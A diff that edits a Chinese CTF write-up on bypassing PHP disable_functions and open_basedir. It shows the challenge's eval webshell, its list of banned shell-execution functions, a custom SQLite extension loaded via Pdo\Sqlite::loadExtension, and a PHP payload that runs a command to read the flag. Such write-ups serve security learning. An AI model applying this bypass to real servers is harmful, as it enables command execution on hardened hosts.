@@ -11,7 +11,7 @@ tocOpen: true
 
 ## kingding
 
-想了半天想不出来curl 非预期怎么打直接用revenge 思路打的
+没有想到通过 curl 进行非预期利用的方法，因此使用了后面 `kinding-revenge` 的思路。
 
 ![题解截图 1](figure-01.jpg)
 
@@ -19,9 +19,9 @@ tocOpen: true
 
 ### 题目与限制
 
-经典绕过 `disable_functions` 和 `open_basedir`  题目，以为能秒，结果uaf 一把梭方法和 已知bypass 方案都被ban了
+这是一道绕过 `disable_functions` 和 `open_basedir` 的题，但常见的 UAF 方案和其他已知绕过方法都被限制了。
 
-```PHP
+```php
 <?php
 highlight_file(__FILE__);
 @eval($_POST['so_ez!k1ddi&g?']);
@@ -29,35 +29,35 @@ highlight_file(__FILE__);
 //**so_ez!k1ddi%26g?**=**phpinfo%28%29%3B**
 ```
 
-```PHP
+```text
 proc_open,pcntl_waitpid,pcntl_wait,dl,ini_restore,mb_send_mail,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,pcntl_alarm,pcntl_sigtimedwait,ini_set
 ```
 
 ### 绕过思路
 
-结合最近bypass open\_basedir 的cve 尝试绕过但失败
+尝试利用近期与 `open_basedir` 相关的漏洞绕过限制，但没有成功：
 
-https://github.com/php/php-src/issues/16802
+[PHP issue：open_basedir 相关问题](https://github.com/php/php-src/issues/16802)
 
 ![题解截图 2](figure-02.jpg)
 
-但偶然看到存在sqlite3 扩展，推测其在`putenv` 被ban情况下也能完成任意路径下\.so加载
+随后发现环境中存在 SQLite3 扩展，推测即使 `putenv` 被禁用，也可能通过它加载指定路径下的 `.so` 文件。
 
-存在`SQLite3::loadExtension` 方法可以加载库，但库必须位于配置选项 sqlite3\.extension\_dir 中指定的目录中。
+`SQLite3::loadExtension` 可以加载库，但库文件必须位于 `sqlite3.extension_dir` 指定的目录中。
 
-https://www.php.net/manual/zh/sqlite3.loadextension.php
+[PHP 手册：SQLite3::loadExtension](https://www.php.net/manual/zh/sqlite3.loadextension.php)
 
 ![题解截图 3](figure-03.jpg)
 
-峰回路转找到在`Pdo\Sqlite::loadExtension` 也存在可以加载库的方法，好像没有配置限制
+继续查找后发现 `Pdo\Sqlite::loadExtension` 也能加载库，且此处似乎没有相同的目录限制。
 
 ![题解截图 4](figure-04.jpg)
 
 ### 构造并写入扩展
 
-依据报错，构造 so 文件
+根据报错信息构造 `.so` 文件：
 
-```C
+```c
 #include <sqlite3ext.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -96,9 +96,9 @@ int sqlite3_exploit_init(
 
 ```
 
-写入，加载
+将编译后的扩展写入目标环境：
 
-```HTTP
+```http
 POST / HTTP/1.1
 Host: 173.32.20.154
 Cache-Control: max-age=0
@@ -117,9 +117,9 @@ Content-Length: 21284
 
 ### 加载扩展并读取 flag
 
-然后拿 flag 即可
+加载扩展并读取 Flag：
 
-```PHP
+```php
 <?php
 file_put_contents("/tmp/1.txt","cat /flag_141f80cc2-4400-45f0-9399-4900efb730f5 > /tmp/4.txt");
 $db = new Pdo\Sqlite('sqlite::memory:');
@@ -128,7 +128,7 @@ $db->loadExtension('/tmp/exploit.so');
 echo file_get_contents("/tmp/4.txt");
 ```
 
-```HTTP
+```http
 POST / HTTP/1.1
 Host: 173.32.20.181
 Cache-Control: max-age=0
